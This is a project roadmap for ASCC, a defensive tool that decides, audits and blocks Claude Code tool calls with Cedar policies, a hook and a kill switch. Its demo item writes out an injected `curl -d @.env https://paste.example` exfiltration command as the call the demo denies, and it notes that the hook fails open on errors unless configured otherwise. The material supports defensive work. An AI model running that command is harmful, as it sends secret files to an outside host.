<h1 align="center">🗺️ Roadmap</h1>

<p align="center">
  <em>From an empty Go CLI to a public ASCC that decides, records and stops Claude Code tool calls, with a live demo, then on to the full platform.</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/now-slice_1:_PDP-F59E0B?style=for-the-badge" alt="Now: Slice 1, policy decision point">
  <img src="https://img.shields.io/badge/stage-incubating-2ea44f?style=for-the-badge" alt="Stage: incubating">
  <a href="README.md"><img src="https://img.shields.io/badge/↩-docs_home-6B7280?style=for-the-badge" alt="Back to docs"></a>
</p>

---

The AI-Security-Command-Center Weekly Roadmap routine works this file top to bottom every Monday, Wednesday and
Friday: it takes the first open item that isn't `🔒 Needs owner` (or up to six `small` ones), builds it, ticks it
and opens a `roadmap/auto-<date>` PR. **Every item above `## After public release` is a release gate.** The repo
goes public when all of them are ticked and Mike says so. Ticking an item adds its line to the
[changelog](CHANGELOG.md) and updates any doc it made stale, in the same commit.

Markers: `- [ ]` open, `- [-]` claimed by a run in progress, `- [x]` done, `- [!]` blocked (the reason follows on
the line). `small` marks docs or config a run can batch, up to six per PR (untagged means a feature, one per run);
`🔒 Needs owner` marks one only Mike can do.

The slices come from [product/build-plan.md](product/build-plan.md), which marks Slices 0 to 3 as the public MVP:
a narrow cut of the plan's own MVP so the core loop ships first. Every slice is tested against fixtures this repo
owns, with fictional agents and repos; no item needs a running service, a credential or network access.

## 🧭 Slice 0: Contracts

- [x] `small` **cedar-go check (TKT-002, cut down).** Write `docs/reports/2026-cedar-go-check.md`: express the five sample policies the spec needs (allow reads in the repo, deny network-capable Bash with a secret path, deny pushes to `main`, deny everything for a suspended agent, default deny) in Cedar, confirm cedar-go evaluates each with the Rust reference's result and returns the determining policy ids, record the cedar-go version and licence, and end with a one-line verdict. If cedar-go can't, add a `🔒 Needs owner` item under this one proposing the ADR-03 fallback and build nothing else until Mike answers. Link it from `docs/README.md`. — done 2026-11-09: `docs/reports/2026-cedar-go-check.md`; cedar-go v1.9.0 matched the Rust reference on 9 of 9 requests and on schema validation, so no fallback. It needs Go 1.26, and a `forbid` that errors fails open in both engines: Slice 1 must deny unknown entities and any evaluation error
- [x] `small` **Claude Code hook contract (TKT-004, cut down).** Write `docs/reports/2026-claude-code-hook-contract.md` from Anthropic's current hooks documentation: the PreToolUse stdin JSON, the output that blocks a call and shows the reason, exit-code semantics, timeout, which tools PreToolUse fires for, and how to register a command hook in `.claude/settings.json`. List any tool the MVP policies need that the hook can't block. Cite each source with the date checked. Link it from `docs/README.md`. — done 2026-11-09: `docs/reports/2026-claude-code-hook-contract.md`; the hook can block every tool the MVP needs. It fails open on a crash, a timeout or bad JSON unless registered with `"onFailure": "block"`, the payload carries no agent identity, and `@` file mentions, Monitor and `PowerShell` need care

## ⚖️ Slice 1: Policy decision point

- [ ] **Registry, Cedar PDP, `decide` and `inventory`** (MVP feature 1). Uses cedar-go v1.9.0 (raise `go.mod` to 1.26 and every doc that says 1.25) and the four fail-closed rules in the [cedar-go check](reports/2026-cedar-go-check.md#findings), with its R8 and R9 as regression tests. The sample policies permit Claude Code's internal tools (`TodoWrite`, `AskUserQuestion`, `ExitPlanMode` and the like) so default deny under matcher `*` doesn't stall a session ([hook contract](reports/2026-claude-code-hook-contract.md), point 5). `ascc.registry.json` (agents: id, owner, runtime, risk tier, status) and `policies/*.cedar` load with clear one-line errors on bad input. `ascc decide --request <file|->` returns JSON with `decision`, the determining policy ids and a plain-English `reason`; anything unmatched, an unknown agent or an unknown tool is a deny. `ascc inventory` writes an agent inventory document (schema v0.1, vendored to `schemas/agent-inventory.schema.json`) with each agent as an identity labelled `enforced`, `observed` or `unmonitored`, and findings with `ruleId` `ascc/<rule>` for no owner, no policy and suspended. Sample `examples/` registry and policies with fictional agents. Table tests cover spec acceptance criteria 1, 2 and 7; the PDP package has no file or network I/O so the WebAssembly build can import it.

## 🛑 Slice 2: Enforce and record

- [ ] **Claude Code hook, hash-chained audit and kill switch** (MVP feature 2). `ascc hook claude-code` reads the PreToolUse payload on stdin, maps it to a PDP request as the Slice 0 contract report describes, and answers in the hook's blocking format; malformed input, a missing policy or any error is a deny with the reason. Every decision appends a JSONL line holding the previous line's SHA-256, the decision, the policy ids, parsed command features and a SHA-256 of the raw input (never the raw input). `ascc audit verify` exits non-zero and names the first edited, removed or reordered line. `ascc kill <agent>` and `ascc revive <agent>` flip registry status and are audited. Tests cover spec acceptance criteria 3 to 6, plus a test that runs the CLI with no network available and proves it opens no socket. `docs/guides/claude-code-setup.md` shows the settings snippet to wire the hook. Follow the seven points at the end of the [hook contract report](reports/2026-claude-code-hook-contract.md): deny with exit 0 and JSON, internal errors with exit 2, agent id from `--agent`, no decision on allow, matcher `*`, `"onFailure": "block"` with a 10 s timeout, Windows path normalisation, `Bash` and `PowerShell` parsed alike.

## 🖥️ Slice 3: Browser demo

- [ ] **WebAssembly policy playground** (MVP feature 3). The PDP and audit packages compiled with `GOOS=js GOARCH=wasm` (or TinyGo if size demands it, with the reason in the PR) and loaded by `site/index.html`. On first load, with no click, a planted registry, policy set and replay list render the injected `curl -d @.env https://paste.example` call as denied with its reason. The visitor can edit the policy, replay calls, watch the audit chain grow, edit a line and see verify fail, and flip the kill switch. A test runs the page script with `fetch` and `XMLHttpRequest` stubbed to fail and proves it still renders (spec criterion 8). A build script writes the page and the `.wasm` to `_site/`, keeping the source bar, the favicon and the `__BUILD_SHA__` build-stamp meta tag.

## 🚦 Public release

- [x] `small` **CI.** `.github/workflows/ci.yml` runs `gofmt -l`, `go vet ./...`, `go test ./...` and `go build ./...` on `ubuntu-latest` and `windows-latest`, on push to `main` and on every PR, with `permissions: contents: read`. — done 2026-11-09: shipped with the scaffold
- [x] `small` **Security.** `SECURITY.md` says how to report a vulnerability and what counts as one. — done 2026-11-09: shipped with the scaffold
- [x] `small` **Demo shell.** `site/index.html` with the org source bar across the top, `<meta name="build" content="__BUILD_SHA__">` in `<head>` and a "coming soon" body, and `site/favicon.svg`, the app icon in the shared dark-tile format. — done 2026-11-09: shipped with the scaffold
- [x] `small` **Secret scan.** `gitleaks git . --log-opts=--all` comes back clean on the full history. — done 2026-11-09: clean on the scaffold commit
- [ ] `small` **README usage matches the code.** Install line (`go install …/src/cmd/ascc@latest`), every command and flag (`decide`, `inventory`, `hook claude-code`, `audit verify`, `kill`, `revive`), a sample run on the `examples/` files with its real output, a coverage section saying what the hook can and can't see, and the spec's Won't list stated plainly. Each command run against a fresh `go build` and behaving as written.
- [ ] `small` **Responsible use.** A README section saying ASCC is defensive only: run it on agents and machines you own or are authorized to control; it never exploits anything, never sends a request anywhere, and writes only its own registry and audit files; a deny is only as good as the policy and the hook's coverage; the demo uses planted fixtures with fictional agents only.
- [ ] `small` **Inventory output validates in CI.** A CI step runs `ascc inventory` on a committed fixture with a planted problem (an agent with no owner) and validates the output against `https://ai-automation-tools.dev/schemas/agent-inventory/v0.1.json` (the vendored copy in `schemas/`, checked to match the published one). The step fails the build when the output doesn't validate or the finding is missing.
- [ ] **Live demo at `https://ai-automation-tools.dev/ai-security-command-center/`.** An `actions/deploy-pages` workflow builds and publishes `_site/` from `main`, replacing `__BUILD_SHA__` with `${{ github.sha }}` before the upload (enable Pages for the repo with `gh api` in the same PR), until the publish step moves it to `https://ai-security-command-center-demo.ai-automation-tools.dev/`. The page shows the MVP working: the planted deny on first load, then edit, replay, tamper and kill. It keeps the source bar and app-icon favicon from the shell, holds no real personal data, and makes no network call. The README hero's Live Demo badge points at it.

## After public release

Nothing below blocks go-live.

## 🧩 Next slices

The plan's Phase 1 ([plan/h-roadmap.md](product/plan/h-roadmap.md)), in its own order. Detail behind each in
[plan/j-backlog.md](product/plan/j-backlog.md) and [plan/k-next-steps.md](product/plan/k-next-steps.md).

- [ ] K3 fail-closed tiers and break-glass rules answered or default accepted (the MVP hook is fail-closed everywhere until then) 🔒 Needs owner
- [ ] K7 plugin runtime model, SDK licence and library location decided 🔒 Needs owner
- [ ] K8 NHI connector scope decided (default: every NHI, read-only first, OpenBao and GitHub first) 🔒 Needs owner
- [ ] K9 workflow-intelligence inputs and audience decided 🔒 Needs owner
- [ ] K10 developer-programme incentives decided (default: none) 🔒 Needs owner
- [ ] `small` **[V] checks.** Every [V] item an ADR or Phase 1 ticket depends on checked against its current source, results written into `plan/k-next-steps.md` §1.
- [ ] **Slice 4: remaining Phase 0 spikes.** TKT-001 gateway build-vs-adopt (agentgateway, Envoy AI Gateway, ContextForge on the five criteria, tested commit hashes), TKT-003 proof-of-possession tokens, TKT-031 plugin contract `v1alpha1` and host prototype. ADR-01 to ADR-17 each marked Accepted, Spike or Replaced with evidence linked; threat model re-rated, T-23 to T-27 included.
- [ ] **Slice 5: schemas and Compose skeleton.** TKT-005 schemas and TKT-006 Compose stack running with one command; registry, STS and the PDP as a service with policy unit tests (M1.1).
- [ ] **Slice 6: MCP and LLM gateway** enforcing allow and deny, Anthropic and OpenAI-compatible adapters, gateway latency measured against NFR-02 (M1.2).
- [ ] **Slice 7: stdio MCP wrapper, default-deny egress and credential broker** working end to end (M1.3).
- [ ] **Slice 8: plugin host, install gate and the OpenBao connector** syncing into the NHI inventory (M1.4).
- [ ] **Slice 9: GitHub connector, console screens, kill switch with per-PEP confirmation** including `disable_plugin` (M1.5).
- [ ] **Slice 10: plan MVP exit.** The demo script in `plan/g-mvp.md` runs green from a cold start, run by someone other than the builder; MVP-1 to MVP-12 pass with evidence linked from G §5 (M1.6).
- [ ] An outside developer builds a connector from the template without help (MVP-11) 🔒 Needs owner
- [ ] Abuse-case suite ABUSE-01 to 27 runs in CI and passes, failures documented as known gaps.
- [ ] Runbook: install, upgrade, break-glass and restore steps verified by a fresh install.
- [ ] Dogfood for two weeks on the lab's own agent fleet with the kill switch exercised at least once 🔒 Needs owner

### 📣 Publish and promote

- [ ] `small` `CONTRIBUTING.md` saying how to run the checks and add a policy with its allow and deny fixtures.
- [ ] `small` Cross-link mcp-frisk, mcp-tool-rugpull-gate and scope-drift-trimmer in the README: they inspect and inventory, ASCC enforces.
- [ ] Tag v0.1 and publish release binaries for Windows, macOS and Linux 🔒 Needs owner
- [ ] "Build a plugin" pages, a template repo per plugin type and the wanted-connectors list (FR-PLG-13), once Slice 8 lands.
- [ ] Launch post built on the demo ("watch the injected curl get denied"), sent where agent-security practitioners read 🔒 Needs owner

### 🏛️ Governance and ecosystem [plan Phase 2]

- [ ] JIT access, approval inbox and access reviews including NHIs (EP-14)
- [ ] PII and injection detectors in flag mode with published precision and recall (EP-15)
- [ ] Six or more connectors live with documented scopes; one lifecycle action executed with full audit (EP-21)
- [ ] Plugin library open with a `community` tier; three plugins from outside the core team listed (EP-22)
- [ ] Deterministic workflow-overlap findings with a measured accept rate (EP-23)
- [ ] A2A enforcement and a second runtime adapter

### 🏢 Enterprise hardening [plan Phase 3]

- [ ] HA, Helm chart, tested restore, multi-tenancy isolation suite
- [ ] Third-party pen test with findings fixed; ASVS L2 evidence 🔒 Needs owner
- [ ] Connector scale test: 50,000 NHIs synced in 15 minutes or less (NFR-18)

### 💰 Revenue

- [!] Not planned; the core is open source in the org (K1). Revisit after the plan's MVP exit if anyone asks for a hosted control plane.

### 🔭 Later [plan Phase 4]

- [ ] Explainable trust scores including NHI hygiene, never used to grant access
- [ ] Independent evaluators and collusion research for multi-agent oversight
- [ ] WASM hot-path detector plugins after the wazero/Extism spike

---

<p align="center">
  <a href="README.md">← Docs home</a> ·
  <a href="CHANGELOG.md">Changelog →</a>
</p>
